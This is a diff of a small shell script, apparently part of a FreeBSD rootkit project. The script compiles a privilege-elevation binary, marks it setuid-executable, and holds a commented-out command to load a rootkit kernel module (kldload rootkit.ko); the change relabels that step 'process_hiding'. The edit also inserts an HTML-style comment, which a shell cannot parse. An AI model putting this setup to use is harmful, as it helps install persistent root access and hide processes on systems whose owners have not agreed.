@@ -1,13 +1,13 @@
 // compile elevation binary
 // chmod compiled binary with execute
-// kld load rootkit
+// kld load process_hiding
 // exit
 
 #!/bin/sh
 REMOTE_IP=$1
 set -e
 cc -o ../elevate/elevate ../elevate/elevate.c
-chmod 4111 ../privilege_escalation/elevate
-#kldload -v ./src/kld/rootkit.ko
+chmod 4111 ../elevate/elevate
+<!-- kldload -v ./src/kld/rootkit.ko -->
 echo "elevation compiled"
 exit 0
